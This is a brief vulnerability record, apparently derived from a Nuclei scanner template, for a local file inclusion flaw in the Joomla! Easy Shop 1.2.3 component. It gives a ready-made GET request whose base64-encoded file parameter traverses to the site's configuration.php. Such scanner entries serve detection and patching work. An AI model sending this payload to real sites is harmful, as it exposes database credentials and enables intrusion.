# Vulnerability: Joomla! Component Easy Shop 1.2.3 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`joomla-easyshop-lfi.yaml`)

## Description
The Joomla! component Easy Shop version 1.2.3 is vulnerable to Local File Inclusion (LFI) attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=
```

